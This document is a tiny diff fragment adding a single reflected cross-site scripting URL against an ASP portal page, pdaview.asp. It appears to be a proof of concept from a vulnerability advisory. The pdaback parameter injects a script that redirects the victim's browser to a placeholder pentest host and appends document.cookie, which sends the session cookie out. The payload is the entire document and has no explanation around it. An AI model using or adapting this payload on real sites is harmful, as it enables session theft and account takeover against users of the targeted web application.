@@ -1,0 +1,3 @@
+https://[Angel
+Root]/portal/pdaview.asp?p_TS=85546&p_id=InTouchMail&pdaback="<script>document.location="http://www.example.com/pentest/pwnt.php?cookie="%2bdocument.cookie;</script>?p_TS=
+85546
